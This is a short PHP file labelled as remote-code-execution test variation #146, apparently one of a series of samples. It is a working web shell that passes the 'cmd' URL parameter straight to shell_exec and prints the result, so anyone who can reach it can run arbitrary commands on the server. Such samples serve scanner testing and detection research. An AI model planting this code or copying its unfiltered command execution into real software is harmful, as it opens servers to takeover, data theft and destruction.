<?php
// RCE test variation #146
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>